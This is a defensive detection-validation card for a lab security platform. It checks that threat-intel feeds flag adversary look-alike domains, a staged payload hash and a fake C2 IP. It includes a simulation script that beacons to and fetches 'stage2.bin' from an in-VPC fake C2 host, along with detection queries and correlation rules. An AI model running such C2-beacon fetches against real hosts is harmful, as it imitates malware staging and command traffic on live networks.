identity.name: TIM Resource-Development Detection — Adversary Infrastructure Staging Surfaced From the Defender Vantage (T1583.001 / T1608.001 / T1585)
identity.summary: XSIAM TIM subscribes to the lab mocktaxii TAXII 2.1 feed carrying Resource-Development indicators — newly-registered look-alike domains, a staged-payload SHA-256, and the provisioned C2 IP the adversary acquired (T1583/T1608). When a lab host resolves or fetches a staged asset, TIM raises an IOC match before any payload runs, proving the SOC sees the adversary's pre-attack build-out.
identity.description: Resource Development (TA0042) is the half of the kill chain that happens on the adversary's side before they ever touch the victim: they acquire infrastructure (T1583 — register look-alike / typosquat domains, stand up VPS / C2 listeners) and stage capabilities on it (T1608 — upload the malware and tooling the operation will later pull down), often establishing fresh accounts (T1585) to do so. Classically invisible to a defender because nothing has hit the estate yet — but a mature Threat Intel Management program closes exactly this gap: high-fidelity TAXII/STIX feeds publish the adversary's freshly-registered domains, staged-payload hashes, and provisioned C2 IPs days before weaponisation, and TIM arms those indicators against the live estate so the very first resolution or fetch is a known-bad verdict. This card validates that TIM loop from the defender vantage against the lab tim IaC topology (infra/modules/aws/tim/): a mocktaxii STIX/TAXII 2.1 server on port 9000 publishes a Resource-Development indicator set — the newly-registered look-alike domain cortexsim-tim-update.internal and the payload-delivery / dga-1a2b3c Route53 subdomains under <project>-tim.internal (the adversary's acquired infrastructure), the SHA-256 of the staged second-stage payload, and the in-VPC fake-C2 IP that the staged domains resolve to. XSIAM TIM subscribes, so the indicators land in the threat_intel feed and the IOC objects are armed. The detection surface is purely feed-driven: when a lab host resolves one of the staged look-alike subdomains (pan_dns), or the NGFW records an outbound fetch from the payload-delivery host (panw_ngfw_traffic_raw / network_story), TIM raises an IOC match against the subscribed feed — flagging the adversary's staged capability the instant it is reached, while the resolved IP and the second-stage hash carry the staged-payload provenance. A correlation rule (CR-TIM-0002) fuses the threat_intel IOC match with the observed DNS resolution and the outbound session into a single Resource-Development incident scoped to the source host. All targets are inside the deployed VPC (private Route53 zone + in-VPC fake C2) — safe by design, no real adversary infrastructure is contacted.

actors.name: Generic financially-motivated and espionage actors staging look-alike domain + payload infrastructure pre-intrusion

campaigns: Generic adversary-infrastructure staging detected from threat-intel feeds

execution.framework_reference_id: SIM-TIM-002 — CortexSim c2_http_beacon EAL plugin resolving + fetching from a TAXII-fed Resource-Development look-alike subdomain (payload-delivery.<project>-tim.internal) resolving to the in-VPC fake C2

prerequisites.description: Lab matching scenario SIM-TIM-002: the tim IaC module deployed (mocktaxii TAXII 2.1 on :9000, fake C2 on :8000, Route53 private zone with the planted look-alike / payload-delivery IOC subdomains).
XSIAM TIM connector subscribed to the mocktaxii collection so the newly-registered look-alike domains, staged-payload SHA-256, and fake-C2 IP land in the threat_intel feed.
prerequisites.check_command: echo 'verify threat_intel dataset contains indicator for payload-delivery.<project>-tim.internal and the staged-payload sha256'

prerequisites.description: NGFW (or Suricata lab stand-in) forwarding session + DNS logs into XSIAM so network_story / panw_ngfw_traffic_raw / pan_dns is populated for the resolution + fetch.
prerequisites.check_command: echo 'verify pan_dns and panw_ngfw_traffic_raw are receiving logs in XSIAM'

payload.code:
# All targets are inside the deployed VPC (private Route53 IOC zone + in-VPC fake C2) — safe by design.
TIM_ZONE="${TIM_ZONE:-cortexsim-tim.internal}"
# step-1: confirm the TAXII collection is reachable and serving the Resource-Development indicators
curl -sf "http://localhost:9000/taxii2/" -H 'Accept: application/taxii+json;version=2.1' | jq -e '.api_roots | length >= 1'
# step-2: resolve + fetch from the staged look-alike / payload-delivery subdomain via the EAL plugin
cat > /tmp/tim-resdev-stage.yml <<YML
campaign_id: CMP-TIM-002
name: "TIM validation — adversary infrastructure staging fetch"
authorized_by: "domain-consultant@paloaltonetworks.com"
simulation_authorized: true
target_allowlist:
  - payload-delivery.${TIM_ZONE}
  - dga-1a2b3c.${TIM_ZONE}
dry_run: false
tags: [tim, resource-development, look-alike-domain, staged-payload, eal]
steps:
  - step_id: step-01
    plugin: c2_http_beacon
    params:
      target_url: http://payload-delivery.${TIM_ZONE}:8000/stage2.bin
      iterations: 3
      sleep_seconds: 5
      jitter_pct: 10
      method: GET
      dga_query_param: false
YML
python3 -m scripts.eal_simulator.cli run /tmp/tim-resdev-stage.yml --live

input_variables.name: TIM_ZONE
input_variables.description: Route53 private-zone suffix from the tim IaC module (terraform output tim_internal_zone), e.g. cortexsim-tim.internal.

expected_artifacts.description: DNS resolution of a TAXII-fed look-alike / payload-delivery IOC subdomain to the fake-C2 IP.
Outbound HTTP fetch of the staged second-stage payload from the resolved fake-C2 IP on port 8000.
expected_artifacts.expected_value: dst_host contains "payload-delivery." AND dst_port = 8000 AND uri contains "stage2.bin"

expected_artifacts.description: XSIAM TIM IOC match raised for the staged look-alike destination against the subscribed TAXII feed.

cleanup.code:
rm -f /tmp/tim-resdev-stage.yml /tmp/stage2.bin
echo '[CortexSim] SIM-TIM-002 cleanup complete — no persistent artifacts'

iocs.context: Newly-registered look-alike (typosquat of the lab estate's update domain) published by the mocktaxii STIX/TAXII 2.1 collection as adversary-acquired infrastructure (T1583.001). TIM flags any resolution of this name as a Resource-Development indicator before any payload runs.

Planted Route53 private-zone subdomain served by the tim IaC module and published by the mocktaxii feed as a staged-capability host (T1608.001 Upload Malware). Resolves to the in-VPC fake-C2 IP and serves the staged second-stage payload.

DGA-style algorithmically-named look-alike subdomain in the mocktaxii feed (adversary domain acquisition, T1583.001). Resolves to the fake C2; validates feed-driven detection of newly-stood-up algorithmic infrastructure.

SHA-256 of the staged second-stage payload (stage2.bin) uploaded to the adversary's payload-delivery host (T1608.001). Published in the mocktaxii feed so an estate host that fetches it is flagged on the file indicator as well as the domain.

Documentation-range stand-in for the in-VPC fake-C2 public IP the staged look-alike subdomains resolve to (the live module value is aws_instance.tim.public_ip). Published in the mocktaxii feed as the adversary's provisioned C2 listener (T1583 Acquire Infrastructure).

biocs.name: TIM-002 Resolution of Newly-Registered Look-Alike Domain From Adversary Infrastructure Feed
biocs.description: An estate host resolves a TAXII-fed newly-registered look-alike / staged-capability subdomain (.internal C2 zone) that TIM has armed as a Resource-Development indicator. Behavioral leg that catches the adversary's acquired domain the instant it is reached — before any payload runs.
biocs.logic:
dataset = pan_dns
| filter dns_query_name contains_any ("payload-delivery.", "dga-1a2b3c.", "cortexsim-tim-update.")
| filter dns_query_name contains ".internal"
| join type=inner (
    dataset = threat_intel
    | filter feed_source = "mocktaxii"
    | filter indicator_type = "domain-name"
    | fields indicator_value
  ) as feed on dns_query_name = feed.indicator_value
| fields _time, src_ip, dns_query_name, dns_response_ip

xql_queries.name: TIM-002 Pre-flight — Resource-Development Indicators Ingested Into Threat Intel
xql_queries.query:
dataset = threat_intel
| filter _time > to_timestamp(current_time() - 86400)
| filter feed_source = "mocktaxii" or feed_name contains "mocktaxii"
| filter indicator_type in ("domain-name", "ipv4-addr", "file-sha256")
| comp count() as indicators by indicator_type
| filter indicators >= 1
| fields indicator_type, indicators

xql_queries.name: TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host
xql_queries.query:
dataset = panw_ngfw_traffic_raw
| filter _time > to_timestamp(current_time() - 1800)
| filter app in ("web-browsing", "http", "ssl")
| filter dst_host contains_any ("payload-delivery.", "dga-1a2b3c.", "cortexsim-tim-update.")
| join type=inner (
    dataset = threat_intel
    | filter feed_source = "mocktaxii"
    | filter indicator_type = "domain-name"
    | fields indicator_value
  ) as feed on dst_host = feed.indicator_value
| comp count() as ioc_hits, count_distinct(dst_host) as matched_indicators by src_ip
| filter ioc_hits >= 1
| fields src_ip, matched_indicators, ioc_hits

xql_queries.name: TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)
xql_queries.query:
dataset = pan_dns
| filter _time > to_timestamp(current_time() - 1800)
| filter dns_query_name contains_any ("payload-delivery.", "dga-1a2b3c.", "cortexsim-tim-update.")
| filter dns_query_name contains ".internal"
| comp count() as resolutions, count_distinct(dns_query_name) as distinct_lookalikes by src_ip
| filter resolutions >= 1
| fields src_ip, distinct_lookalikes, resolutions

xql_queries.name: TIM-002 Stitch — Resource-Development Feed Match Joined to Resolution and Session on Source Host
xql_queries.query:
dataset = network_story
| filter _time > to_timestamp(current_time() - 1800)
| filter dst_host contains ".internal"
| join type=inner (
    dataset = threat_intel
    | filter feed_source = "mocktaxii"
    | filter indicator_type = "domain-name"
    | fields indicator_value
  ) as feed on dst_host = feed.indicator_value
| comp count_distinct(dst_host) as matched_iocs, count() as sessions, min(_time) as first_seen, max(_time) as last_seen by src_ip
| filter matched_iocs >= 1
| fields src_ip, matched_iocs, sessions, first_seen, last_seen

xql_queries.name: TIM-002 Staged Second-Stage Payload Hash Seen On Estate (T1608.001)
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 86400)
| filter event_type = ENUM.FILE
| filter action_file_sha256 in ("9f2c4b7e1a3d5f6082b4c6d8e0a2f4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8")
| comp count() as observed by agent_hostname, action_file_path
| fields agent_hostname, action_file_path, observed

correlation_rules.name: TIM — Adversary Resource-Development Infrastructure Reached On Estate
correlation_rules.logic: XQL(TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host) AND XQL(TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)) -> join on src_host within 300s. Promotes a benign-looking lookup + fetch to a Resource-Development incident because the destination matches the adversary infrastructure published in the subscribed mocktaxii TAXII feed before any payload detonates.

analytics_modules: Cortex XSIAM Threat Intel Management — TAXII 2.1 feed ingestion + Resource-Development IOC matching (newly-registered / look-alike domains, staged-payload hash, provisioned C2 IP)
Cortex XSIAM Network Security Analytics — first-contact resolution of a newly-observed feed-listed domain
Cortex XSIAM Correlation Engine — Resource-Development feed match stitched to DNS resolution + NDR session by src_host

products.evidence_query: dataset = threat_intel | filter feed_source = "mocktaxii" | comp count() as indicators by indicator_type | fields indicator_type, indicators

Correlation CR-TIM-0002 joins the mocktaxii Resource-Development IOC match to the DNS resolution + NGFW session on src_host within 300s, yielding an incident driven by the adversary's staged infrastructure.
dataset = pan_dns | filter dns_query_name contains_any ("payload-delivery.", "cortexsim-tim-update.") | fields _time, src_ip, dns_query_name, dns_response_ip

Playbook: enrich the matched Resource-Development indicator from TIM (domain age, registrar, feed provenance), pre-emptively block the look-alike domain + C2 IP at NGFW/DNS, sweep the estate for the staged-payload hash, open a DFIR ticket with the feed provenance.

use_cases.name: Threat Intel Management — Resource-Development (Adversary Infrastructure Staging) Detection
use_cases.description: Validate that XSIAM TIM ingests the mocktaxii Resource-Development indicator set (newly-registered look-alike domains, staged-payload SHA-256, provisioned C2 IP), raises an IOC match when a lab host resolves/fetches from the staged infrastructure, and stitches the feed-match to the DNS resolution and NGFW session into a single Resource-Development incident before any payload detonates.

test_cases.objective: The subscribed mocktaxii Resource-Development feed is ingested and an IOC match fires on the resolution/fetch of the staged look-alike infrastructure.
preconditions: tim IaC module deployed (mocktaxii :9000, fake C2 :8000, Route53 IOC zone with payload-delivery / dga-1a2b3c subdomains).
XSIAM TIM connector subscribed to the mocktaxii collection.
NGFW (or Suricata lab) forwarding session + DNS logs into XSIAM.
steps: Run SIM-TIM-002 step-01 (confirm TAXII collection reachable) and step-02 (ingest-check XQL across domain/ipv4/sha256 indicator types).
Run SIM-TIM-002 step-03 (resolve + fetch stage2.bin from payload-delivery.<zone>:8000).
Inspect threat_intel + pan_dns + panw_ngfw_traffic_raw for the source host.
success_criteria: XQL `TIM-002 Pre-flight — Resource-Development Indicators Ingested Into Threat Intel` returns >= 1 row.
XQL `TIM-002 IOC Match — Outbound Fetch From TAXII-Fed Staged-Capability Host` returns >= 1 row.
XQL `TIM-002 Newly-Registered Look-Alike Domain Resolution Surfaced (NDR DNS leg)` returns >= 1 row.

test_cases.objective: The Resource-Development feed match stitches to the DNS resolution and NDR session into a single incident, surfacing adversary infrastructure staging from the defender vantage.
success_criteria: Correlation `CR-TIM-0002` groups the IOC feed match, the DNS resolution, and the NGFW session on src_host into one incident_id.
XQL `TIM-002 Stitch — Resource-Development Feed Match Joined to Resolution and Session on Source Host` returns >= 1 row.
BIOC `TIM-002 Resolution of Newly-Registered Look-Alike Domain From Adversary Infrastructure Feed` matches the staged-domain resolution.

preventive_controls: Subscribe XSIAM TIM to newly-registered-domain and look-alike/typosquat feeds and arm matching against DNS + NGFW telemetry so adversary-acquired infrastructure blocks at first contact.
Enable Advanced DNS Security newly-registered-domain and DGA categories so resolutions of freshly-stood-up adversary domains are denied pre-emptively.
Operate brand/domain-monitoring to catch look-alike registrations of the estate's own domains and feed them back into TIM as custom indicators.
detection_engineering: Treat a TIM feed match on a newly-registered / look-alike domain as a Resource-Development early-warning signal and join it to the first DNS resolution + session that touched it rather than alerting on the raw feed alone.
Sweep the estate for staged-payload hashes published in the feed (T1608.001) even when no resolution to the staging host has occurred yet.
Score feed provenance and domain age into the incident so analysts can prioritise freshly-registered infrastructure.

changelog.author: Henry Reed
changelog.change: Initial Resource-Development (TA0042) card for the TIM plane (SIM-TIM-002) — first TA0042 coverage in the corpus. MITRE T1583.001 (primary) + T1608.001 + T1585. Real TIM IOC-feed-match content surfacing adversary infrastructure staging from the defender vantage: 5 IOCs (newly-registered look-alike domain, payload-delivery + dga-1a2b3c Route53 subdomains, staged-payload SHA-256, fake-C2 IP), 1 DNS-leg BIOC over pan_dns+threat_intel, 5 XQL validation/hunt queries across threat_intel/panw_ngfw_traffic_raw/pan_dns/network_story/xdr_data, and correlation CR-TIM-0002 stitching the feed match to the resolution + session on src_host within 300s. Validates the tim IaC topology. Promoted to active.
